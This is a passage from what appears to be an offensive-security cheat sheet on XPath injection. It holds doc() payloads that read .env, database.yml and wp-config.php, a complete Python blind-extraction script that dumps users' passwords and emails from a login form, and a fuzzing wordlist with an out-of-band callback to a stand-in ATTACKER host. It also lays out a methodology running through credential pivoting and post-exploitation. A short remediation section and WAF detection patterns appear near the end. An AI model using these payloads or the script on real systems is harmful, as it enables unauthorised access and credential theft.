' or doc('file:///var/www/html/.env') or '1'='2
```

```text [Read Database Config]
' or doc('file:///var/www/html/config/database.yml') or '1'='2
```

```text [Read wp-config.php]
' or doc('file:///var/www/html/wp-config.php') or '1'='2
```

::

---

## Automation Scripts

### Python Blind XPath Extraction Script

::collapsible
---
label: "Automated Blind XPath Data Extractor"
---

```python [xpath_blind_extractor.py]
#!/usr/bin/env python3
"""
Blind XPath Injection Data Extractor
Extracts data character by character using boolean-based blind technique.
"""

import requests
import string
import sys
import time

# === CONFIGURATION ===
TARGET_URL = "http://target.com/login"
METHOD = "POST"  # POST or GET
PARAM_NAME = "username"
PARAM_PASSWORD = "password"
PASSWORD_VALUE = "anything"

# Characters to test
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_-+={}[]|:;<>?,./"

# Indicators
TRUE_INDICATOR = "Welcome"       # String present in response when condition is TRUE
FALSE_INDICATOR = "Invalid"      # String present in response when condition is FALSE

# XPath node to extract
XPATH_TARGET = "//user[1]/password"

# === FUNCTIONS ===

def test_condition(condition_payload):
    """Send payload and determine if condition is TRUE or FALSE."""
    payload = f"' or {condition_payload} or '1'='2"
    
    if METHOD == "POST":
        data = {PARAM_NAME: payload, PARAM_PASSWORD: PASSWORD_VALUE}
        response = requests.post(TARGET_URL, data=data, timeout=10)
    else:
        params = {PARAM_NAME: payload, PARAM_PASSWORD: PASSWORD_VALUE}
        response = requests.get(TARGET_URL, params=params, timeout=10)
    
    return TRUE_INDICATOR in response.text


def extract_string_length(xpath_node, max_length=100):
    """Determine the length of an XPath string value using binary search."""
    low, high = 1, max_length
    
    while low <= high:
        mid = (low + high) // 2
        
        if test_condition(f"string-length({xpath_node})>={mid}"):
            if not test_condition(f"string-length({xpath_node})>={mid + 1}"):
                return mid
            low = mid + 1
        else:
            high = mid - 1
    
    return 0


def extract_character(xpath_node, position):
    """Extract a single character at the given position."""
    for char in CHARSET:
        # Escape single quote in character
        safe_char = char
        if char == "'":
            continue  # Skip single quote or handle separately
        
        condition = f"substring({xpath_node},{position},1)='{safe_char}'"
        
        if test_condition(condition):
            return char
    
    return "?"


def extract_string(xpath_node):
    """Extract full string value from an XPath node."""
    print(f"[*] Extracting: {xpath_node}")
    
    length = extract_string_length(xpath_node)
    print(f"[*] String length: {length}")
    
    if length == 0:
        print("[-] Could not determine string length.")
        return ""
    
    result = ""
    for i in range(1, length + 1):
        char = extract_character(xpath_node, i)
        result += char
        sys.stdout.write(f"\r[+] Extracted: {result}")
        sys.stdout.flush()
    
    print()
    return result


def enumerate_users(max_users=20):
    """Enumerate all users and extract their data."""
    # First, determine number of users
    user_count = 0
    for i in range(1, max_users + 1):
        if test_condition(f"count(//user)>={i}"):
            user_count = i
        else:
            break
    
    print(f"[*] Found {user_count} users")
    
    for i in range(1, user_count + 1):
        print(f"\n{'='*50}")
        print(f"[*] USER {i}")
        print(f"{'='*50}")
        
        username = extract_string(f"//user[{i}]/username")
        password = extract_string(f"//user[{i}]/password")
        role = extract_string(f"//user[{i}]/role")
        email = extract_string(f"//user[{i}]/email")
        
        print(f"  Username: {username}")
        print(f"  Password: {password}")
        print(f"  Role:     {role}")
        print(f"  Email:    {email}")


def enumerate_structure():
    """Enumerate XML document structure."""
    print("[*] Enumerating XML document structure...")
    
    # Root element name
    root_name = extract_string("name(/*)")
    print(f"[*] Root element: <{root_name}>")
    
    # First child element name
    child_name = extract_string("name(/*/*[1])")
    print(f"[*] First child: <{child_name}>")
    
    # Count children of first child
    field_count = 0
    for i in range(1, 20):
        if test_condition(f"count(/*/*[1]/*)>={i}"):
            field_count = i
        else:
            break
    
    print(f"[*] Fields per record: {field_count}")
    
    # Extract field names
    for i in range(1, field_count + 1):
        field_name = extract_string(f"name(/*/*[1]/*[{i}])")
        print(f"  Field {i}: <{field_name}>")


# === MAIN ===
if __name__ == "__main__":
    print("=" * 60)
    print("  Blind XPath Injection Extractor")
    print("=" * 60)
    print(f"  Target: {TARGET_URL}")
    print(f"  Method: {METHOD}")
    print()
    
    # Step 1: Verify injection
    print("[*] Testing injection...")
    if test_condition("'1'='1'"):
        print("[+] Injection confirmed! TRUE condition detected.")
    else:
        print("[-] Injection not confirmed. Check configuration.")
        sys.exit(1)
    
    # Step 2: Enumerate structure
    enumerate_structure()
    
    # Step 3: Extract all users
    enumerate_users()
    
    print("\n[*] Extraction complete.")
```
::

### Burp Suite Intruder Wordlist

::collapsible
---
label: "XPath Injection Fuzzing Wordlist"
---

```text [xpath_fuzz.txt]
'
"
' or '1'='1
' or '1'='1' --
' or '1'='1' or '
' or ''='
' or 1=1 or '1'='1
' or true() or '
' or 'a'='a
" or "1"="1
" or "a"="a
') or ('1'='1
')) or (('1'='1
'] or ['1'='1
' or '1'='1' and '1'='1
' or string-length('a')=1 or '1'='1
' or contains('a','a') or '1'='1
' or starts-with('a','a') or '1'='1
' or position()=1 or '1'='1
' or count(//*)>0 or '1'='1
' or not(false()) or '1'='1
admin' or '1'='1
admin' or '1'='1' --
'] | //* | //nothing['
'] | //password | //nothing['
'] | //username | //nothing['
'] | //*[1] | //nothing['
' or '1'='1'|//|'
' or substring(//user[1]/username,1,1)='a' or '1'='2
' or string-length(//user[1]/username)>0 or '1'='2
' or count(//user)>0 or '1'='2
' or name(/*)='users' or '1'='2
' or 1 div 0 or '1'='1
%27 or %271%27=%271
%27%20or%20%271%27%3D%271
&apos; or &apos;1&apos;=&apos;1
&#39; or &#39;1&#39;=&#39;1
&#x27; or &#x27;1&#x27;=&#x27;1
' or doc('http://ATTACKER/callback') or '1'='2
' or true()
' and false() or '1'='1
```
::

---

## XPath Function Reference

A comprehensive reference of XPath functions useful for injection attacks.

### XPath 1.0 Functions

::collapsible
---
label: "String Functions"
---

| Function | Description | Injection Use |
|----------|-------------|---------------|
| `string()` | Converts to string | Type conversion |
| `concat(s1, s2, ...)` | Concatenates strings | Build strings to bypass filters |
| `contains(str, substr)` | Checks if string contains substring | Search for partial matches |
| `starts-with(str, prefix)` | Checks if string starts with prefix | Enumerate values |
| `substring(str, start, len)` | Extracts substring | Character-by-character extraction |
| `substring-before(str, delim)` | String before delimiter | Parse structured values |
| `substring-after(str, delim)` | String after delimiter | Parse structured values |
| `string-length(str)` | Returns string length | Determine value length |
| `normalize-space(str)` | Strips whitespace | Clean comparison values |
| `translate(str, from, to)` | Character replacement | Case conversion, obfuscation |
::

::collapsible
---
label: "Numeric Functions"
---

| Function | Description | Injection Use |
|----------|-------------|---------------|
| `number()` | Converts to number | Type conversion |
| `sum()` | Sum of node-set | Aggregate analysis |
| `floor()` | Round down | Numeric comparison |
| `ceiling()` | Round up | Numeric comparison |
| `round()` | Round to nearest | Numeric comparison |
::

::collapsible
---
label: "Boolean Functions"
---

| Function | Description | Injection Use |
|----------|-------------|---------------|
| `boolean()` | Converts to boolean | Force true/false evaluation |
| `true()` | Returns true | Always-true condition |
| `false()` | Returns false | Always-false condition |
| `not()` | Logical NOT | Invert conditions |
::

::collapsible
---
label: "Node Set Functions"
---

| Function | Description | Injection Use |
|----------|-------------|---------------|
| `count()` | Count nodes in set | Enumerate number of records |
| `name()` | Element name | Discover XML structure |
| `local-name()` | Local element name (no namespace) | Structure discovery with namespaces |
| `namespace-uri()` | Namespace URI | Identify XML namespaces |
| `position()` | Current node position | Select specific records |
| `last()` | Last position in set | Select last record |
| `id()` | Select by ID attribute | Access specific nodes |
::

### XPath 2.0 Additional Functions

::collapsible
---
label: "XPath 2.0 Extended Functions"
---

| Function | Description | Injection Use |
|----------|-------------|---------------|
| `matches(str, regex)` | Regex matching | Pattern-based data discovery |
| `replace(str, pattern, replacement)` | Regex replace | Data manipulation |
| `tokenize(str, delimiter)` | Split string | Parse delimited values |
| `lower-case(str)` | Convert to lowercase | Case-insensitive comparison |
| `upper-case(str)` | Convert to uppercase | Case-insensitive comparison |
| `ends-with(str, suffix)` | Check string suffix | Enumerate value endings |
| `compare(s1, s2)` | String comparison | Binary search optimization |
| `string-join(sequence, separator)` | Join strings | Aggregate extraction |
| `codepoints-to-string(int)` | Integer to character | Character code extraction |
| `string-to-codepoints(str)` | Character to integer | Numeric character analysis |
| `distinct-values(sequence)` | Unique values | Discover unique roles/types |
| `subsequence(seq, start, len)` | Subsequence selection | Paginated extraction |
| `doc(uri)` | Load external document | **File read, SSRF, OOB exfiltration** |
| `unparsed-text(uri)` | Read text file (XPath 3.0) | **Local file read** |
| `environment-variable(name)` | Read env var (Saxon) | **Environment data leak** |
| `collection(uri)` | Load document collection | Directory/collection enumeration |
::

---

## XPath vs SQL Injection Comparison

Understanding the differences helps you adapt your approach.

| Aspect | SQL Injection | XPath Injection |
|--------|--------------|-----------------|
| **Data Store** | Relational database (tables) | XML document (tree) |
| **Query Language** | SQL | XPath |
| **Data Modification** | INSERT, UPDATE, DELETE available | **Read-only** — no modification |
| **Access Control** | Database users, roles, privileges | **None** — full document access |
| **Comments** | `--`, `/* */`, `#` | **None in XPath 1.0** |
| **UNION Attacks** | `UNION SELECT` | Pipe operator `\|` (node union) |
| **Blind Extraction** | `AND 1=1`, `SLEEP()` | `substring()`, `string-length()` |
| **Stacked Queries** | Supported (`;`) | **Not supported** |
| **Out-of-Band** | `LOAD_FILE()`, DNS, HTTP | `doc()` function (XPath 2.0) |
| **Error-Based** | Type conversion errors | Malformed expression errors |
| **Parameterized Queries** | Prepared statements | Parameterized XPath / precompiled |
| **Impact Scope** | Specific table/database | **Entire XML document** |

::tip
The most significant advantage of XPath Injection over SQL Injection is that XML has **no access control**. Once you can inject, you can access **everything** in the document — there are no user permissions or role restrictions on the data.
::

---

## Attack Methodology

::steps{level="3"}

### Reconnaissance & Discovery

Identify XML-backed applications, SOAP services, and input fields that may feed into XPath queries.


  ::field{name="Technology Stack" type="string"}
  Identify web server, application framework, and XML processing libraries from response headers, error messages, and page behavior.
  ::

  ::field{name="File Extensions" type="indicator"}
  Look for `.xml`, `.xsl`, `.xslt` file references. SOAP endpoints often end in `?wsdl`.
  ::

  ::field{name="Input Parameters" type="string"}
  Map all input vectors: form fields, URL parameters, HTTP headers, cookies, JSON/XML request bodies.
  ::

  ::field{name="Error Messages" type="indicator"}
  Submit `'` and `"` in all parameters. XPath errors reveal the query structure and confirm the technology.
  ::

  ::field{name="Response Behavior" type="indicator"}
  Note differences between valid input, invalid input, and malformed input responses. These behavioral differences enable blind injection.
  ::


### Injection Confirmation

Confirm XPath injection with boolean differential analysis.

```text [TRUE condition]
' or '1'='1
```

```text [FALSE condition]
' or '1'='2
```

If the application responds differently to TRUE vs FALSE, XPath injection is confirmed.

### Document Structure Enumeration

Map the XML document structure before extracting data.

```text [Root element name]
' or substring(name(/*),1,1)='u' or '1'='2
```

```text [Count records]
' or count(//user)>0 or '1'='2
```

```text [Count fields per record]
' or count(/*/*[1]/*)>5 or '1'='2
```

### Data Extraction

Extract all data using appropriate technique (in-band, blind, error-based, or OOB).

For in-band:
```text
'] | //username | //password | //user['
```

For blind:
```text
' or substring(//user[1]/password,1,1)='s' or '1'='2
```

### Credential Analysis & Pivot

Analyze extracted credentials for reuse across SSH, databases, admin panels, APIs, and cloud services.

### Post-Exploitation

Use extracted data for privilege escalation, lateral movement, and further compromise.

::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Parameterized XPath Queries
  icon: i-lucide-shield-check
  ---
  Use **precompiled XPath expressions** with parameterized variables instead of string concatenation. Most XML libraries support this:

  **Java:**
  ```java
  xpath.setXPathVariableResolver(...)
  ```

  **C#/.NET:**
  ```csharp
  XsltArgumentList with XPathNavigator
  ```
  ::

  ::card
  ---
  title: Input Validation & Sanitization
  icon: i-lucide-filter
  ---
  Reject or escape XPath metacharacters from all user input: single quotes `'`, double quotes `"`, brackets `[]`, parentheses `()`, forward slash `/`, pipe `|`, at sign `@`, and ampersand `&`.
  ::

  ::card
  ---
  title: Whitelist Input Validation
  icon: i-lucide-check-circle
  ---
  Define strict input patterns using regular expressions. Usernames should only contain `[a-zA-Z0-9_-]`. Reject any input containing XPath special characters.
  ::

  ::card
  ---
  title: Least Privilege Architecture
  icon: i-lucide-lock
  ---
  Avoid storing sensitive data (passwords, API keys, tokens) in XML files. Use proper databases with access control, hashing, and encryption instead.
  ::

  ::card
  ---
  title: Error Handling
  icon: i-lucide-eye-off
  ---
  Never expose XPath error messages to users. Implement generic error pages and log detailed errors server-side only.
  ::

  ::card
  ---
  title: Move Away from XML Data Stores
  icon: i-lucide-database
  ---
  Migrate authentication and sensitive data storage from XML files to **relational databases** with parameterized queries, bcrypt password hashing, and role-based access control.
  ::

  ::card
  ---
  title: WAF Rules
  icon: i-lucide-brick-wall
  ---
  Deploy WAF rules to detect XPath injection patterns including `' or`, `' and`, `substring(`, `string-length(`, `//user`, and `doc(` in HTTP parameters.
  ::

  ::card
  ---
  title: XML External Entity (XXE) Protection
  icon: i-lucide-shield
  ---
  If using XPath 2.0, disable the `doc()` function and external entity resolution to prevent SSRF and local file read attacks.
  ::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept requests, modify parameters with XPath payloads, and use Intruder for automated blind extraction with the fuzzing wordlist.
  ::

  ::card
  ---
  title: XPath Blind Explorer
  icon: i-lucide-terminal
  to: https://github.com/micsoftvn/xpath-blind-explorer
  target: _blank
  ---
  Dedicated tool for automated blind XPath injection exploitation and data extraction.
  ::

  ::card
  ---
  title: xcat
  icon: i-lucide-cat
  to: https://github.com/orf/xcat
  target: _blank
  ---
  XPath injection exploitation tool that automates data extraction using multiple techniques including OOB and error-based.
  ::

  ::card
  ---
  title: XMLChor
  icon: i-lucide-code
  to: https://github.com/Harshal35/XMLCHOR
  target: _blank
  ---
  Automated XPath injection scanner and exploitation framework for blind and in-band techniques.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for brute-forcing parameters with XPath injection wordlists.
  ::

  ::card
  ---
  title: Custom Python Scripts
  icon: i-lucide-file-code
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Write targeted extraction scripts using the Python template provided above. Customize for specific target query structures and response patterns.
  ::
::